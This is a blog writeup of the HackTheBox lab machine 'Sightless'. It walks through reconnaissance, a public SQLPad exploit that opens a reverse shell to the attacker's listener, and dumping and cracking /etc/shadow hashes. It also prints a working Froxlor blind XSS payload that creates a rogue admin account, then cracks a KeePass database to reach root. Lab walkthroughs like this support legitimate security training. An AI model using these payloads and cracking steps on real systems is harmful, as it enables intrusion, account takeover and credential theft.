+++
date = '2025-02-17T19:00:06-05:00'
draft = false
title = 'Htb Sightless'
tags = ['writeup','hackthebox','easy','linux']
hideToc = false
+++
![HtB-Sightless](/images/Sightless.png)

`Sightless` is an easy-difficulty Linux machine featuring a website for a company offering various services. Enumeration of the website reveals an `SQLPad` instance vulnerable to template injection [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944), which is leveraged to gain a foothold inside a Docker container. Further enumeration reveals the `/etc/shadow` file with a password hash, which is cracked to reveal the password, granting `SSH` access to the host. Post-exploitation enumeration reveals a `Froxlor` instance vulnerable to Blind `XSS` [CVE-2024-34070](https://nvd.nist.gov/vuln/detail/CVE-2024-34070). This is leveraged to gain access to the `FTP` service, which contains a `KeePass` database. Accessing the database reveals the root `SSH` keys, leading to a privileged shell on the host.

<!--more-->
---

## Scanning

### nmap

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ nmap -T4 -p- -A 10.129.231.103
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 22:32 EST
Nmap scan report for 10.129.231.103
Host is up (0.026s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.129.231.103]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://sightless.htb/
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=2/10%Time=67AAC4D9%P=aarch64-unknown-linux-gnu%
SF:r(GenericLines,A3,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\
SF:x20Server\)\x20\[::ffff:10\.129\.231\.103\]\r\n500\x20Invalid\x20comman
SF:d:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x2
SF:0try\x20being\x20more\x20creative\r\n");
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ProFTPD - 21/tcp

Doesn't seem to like a standard connection; wants SSL/TLS. When trying to use `sftp`, anonymous login isn't allowed.

### nginx 1.18.0 - 80/tcp

`http://sightless.htb/`
![sightless1](/images/sightless1.png)

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ gobuster dir -u http://sightless.htb/ -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sightless.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/icones               (Status: 301) [Size: 178] [--> http://sightless.htb/icones/]
/images               (Status: 301) [Size: 178] [--> http://sightless.htb/images/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

Seems to be one valid service off the main page: SQLPad 6.10.0 (`sqlpad.sightless.htb`)

![sightless2](/images/sightless2.png)

## Initial Access

### SQLPad (CVE-2022-0944)

A simple Google search for "SQLPad 6.10.0 exploit" brought me to an [exploit POC](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944) for CVE-2022-0944.

>This Bash script exploits an RCE vulnerability in SQLPad 6.10.0, allowing an attacker to achieve remote code execution (RCE) by abusing the host and database fields in SQLPad’s MySQL database connection settings. The exploit leverages SQLPad’s unsanitized handling of the child_process module in Node.js to execute arbitrary commands, ultimately opening a reverse shell on the attacker's machine.

```
┌──(pl4stic㉿kali)-[~/htb/sightless/SQLPad-6.10.0-Exploit-CVE-2022-0944]
└─$ ./CVE-2022-0944 
Please make sure to start a listener on your attacking machine using the command:
nc -lvnp 9001
Waiting for you to set up the listener...
Press [Enter] when you are ready...
Please provide the target host (e.g., x.x.com): 
sqlpad.sightless.htb
Please provide your IP address (e.g., 10.10.16.3): 
10.10.14.42
Exploit sent. If everything went well, check your listener for a connection on port 9001.

```

```
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ nc -nvlp 9001 
listening on [any] 9001 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.231.103] 57216
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c184118df0a6:/var/lib/sqlpad#
```

Looks like this gets us into a Docker shell.

## Docker Escape

### /etc/shadow

Since we have root access within the container, and there seems to be at least one other user account, let's check the `/etc/shadow` file to see if we can grab any hashes to try and crack.

```sh
root@c184118df0a6:/tmp# cat /etc/shadow 
cat /etc/shadow
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
[--snip--]
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
```

### Hash crack

```sh
# root
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ hashcat '$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.' /usr/share/wordlists/rockyou.txt.gz
[--snip--]
$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:blindside
[--snip--]
```

```sh
# michael
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ hashcat -m 1800 '$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/' /usr/share/wordlists/rockyou.txt.gz
[--snip--]
$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
[--snip--]
```

### SSH as michael

Instead of trying to put together a complicated container breakout, why not try credentials when you have credentials.

```
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ ssh michael@sightless.htb
michael@sightless.htb's password: 
Last login: Tue Feb 11 04:03:46 2025 from 10.10.14.42
michael@sightless:~$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael)
```

Grab `user.txt` and let's keep going.

## Privilege Escalation

### LinPEAS

Let's upload and execute `linpeas.sh`; here's some interesting findings.

```sh
╔══════════╣ Hostname, hosts and DNS
sightless                                                                                                             
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                          
tcp      0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:35853         0.0.0.0:*               LISTEN      -
tcp      0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp      0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:35803         0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:36907         0.0.0.0:*               LISTEN      -
tcp      0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp6     0      0 :::22                   :::*                    LISTEN      -
tcp6     0      0 :::21                   :::*                    LISTEN      -

╔══════════╣ Users with console
john:x:1001:1001:,,,:/home/john:/bin/bash
michael:x:1000:1000:michael:/home/michael:/bin/bash
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1000(michael) gid=1000(michael) groups=1000(michael)
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)

-rw-r--r-- 1 root root 1414 Aug  9  2024 /etc/apache2/sites-available/000-default.conf
<VirtualHost 127.0.0.1:8080>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html/froxlor
        ServerName admin.sightless.htb
        ServerAlias admin.sightless.htb
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

### Froxlor

Let's setup a port forward, edit our `/etc/hosts` and check out what's running on port 8080.

```
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ ssh -L 8080:localhost:8080  michael@sightless.htb    
michael@sightless.htb's password: 
Last login: Tue Feb 11 04:05:46 2025 from 10.10.14.42
michael@sightless:~$
```

Add `127.0.0.1   admin.sightless.htb` to our `/etc/hosts`

![sightless3](/images/sightless3.png)

#### Exploit (CVE-2024-34070)

After a lot of Google searching, I came across CVE-2024-34070.

>A Stored Blind Cross-Site Scripting (XSS) vulnerability has been identified in the Failed Login Attempts Logging Feature of the Froxlor Application. Stored Blind XSS occurs when user input is not properly sanitized and is stored on the server, allowing an attacker to inject malicious scripts that will be executed when other users access the affected page. In this case, an unauthenticated User can inject malicious scripts in the loginname parameter on the Login attempt, which will then be executed when viewed by the Administrator in the System Logs.

I found an example payload for this CVE [here](https://github.com/advisories/GHSA-x525-54hf-xr53). The payload essentially creates a new admin user. This payload has been URL decoded and formatted; when you send the payload, remember to remove formatting and URL encode.

```js
admin{{$emit.constructor`
	function b(){
		var metaTag=document.querySelector('meta[name="csrf-token"]');
		var csrfToken=metaTag.getAttribute('content');
		var xhr=new XMLHttpRequest();
		var url="https://admin.sightless.htb/admin_admins.php";
		var params="new_loginname=pl4stic&admin_password=pl4stic&admin_password_suggestion=mgphdKecOu&def_language=en&api_allowed=0&api_allowed=1&name=pl4stic&email=pl4stic@hacked.you&custom_notes=&custom_notes_show=0&ipaddress=-1&change_serversettings=0&change_serversettings=1&customers=0&customers_ul=1&customers_see_all=0&customers_see_all=1&domains=0&domains_ul=1&caneditphpsettings=0&caneditphpsettings=1&diskspace=0&diskspace_ul=1&traffic=0&traffic_ul=1&subdomains=0&subdomains_ul=1&emails=0&emails_ul=1&email_accounts=0&email_accounts_ul=1&email_forwarders=0&email_forwarders_ul=1&ftps=0&ftps_ul=1&mysqls=0&mysqls_ul=1&csrf_token="+csrfToken+"&page=admins&action=add&send=send";
		xhr.open("POST",url,true);
		xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
		xhr.send(params)};a=b()`()
	}
}
```

It worked, we've got access to the administration portal.

![sightless4](/images/sightless4.png)

Looking at the Resources -> Customers area, it seems we have one user `john`. Thinking back to earlier, he was the account that had `sudo` rights, so maybe there's something we can do with this.

![sightless5](/images/sightless5.png)

We can edit John's account, and change his password. Let's log back into the Froxlor service with these new credentials. He has an FTP account, which we can also change the password for.

![sightless6](/images/sightless6.png)

### FTP Server

Lets connect to the FTP server using John's username, `web1` and the newly changed password.

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ lftp sightless.htb
lftp sightless.htb:~> login web1 Pass11!!
lftp web1@sightless.htb:~> set ssl:verify-certificate no
lftp web1@sightless.htb:~> ls
drwxr-xr-x   3 web1     web1         4096 May 17  2024 goaccess
-rw-r--r--   1 web1     web1         8376 Mar 29  2024 index.html
lftp web1@sightless.htb:/> cd goaccess
lftp web1@sightless.htb:/goaccess> ls
drwxr-xr-x   2 web1     web1         4096 Aug  2  2024 backup
lftp web1@sightless.htb:/goaccess> cd backup
lftp web1@sightless.htb:/goaccess/backup> ls
-rw-r--r--   1 web1     web1         5292 Aug  6  2024 Database.kdb
lftp web1@sightless.htb:/goaccess/backup> get Database.kdb
5292 bytes transferred                         
lftp web1@sightless.htb:/goaccess/backup>
```

And we've found a Keepass database... I bet there's some good stuff in there.

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ file Database.kdb 
Database.kdb: Keepass password database 1.x KDB, 8 groups, 4 entries, 600000 key transformation rounds
```

#### Hash crack

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ keepass2john Database.kdb > keepass-hash.txt
Inlining Database.kdb
```

```sh
┌──(pl4stic㉿kali)-[~/htb/sightless]
└─$ john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt /home/pl4stic/htb/sightless/keepass-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 600000 for all loaded hashes
Cost 2 (version) is 1 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bulldogs         (Database.kdb)     
1g 0:00:00:16 DONE (2025-02-11 10:02) 0.06238g/s 71.86p/s 71.86c/s 71.86C/s kucing..summer1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Keepass Database

Using our cracked password, `bulldogs`, let's see whats inside the Keepass database.

![sightless7](/images/sightless7.png)

![sightless8](/images/sightless8.png)

Hey look, credentials for `root` and an SSH key, `id_rsa`.  Use both of those to gain a root shell, and grab `root.txt`
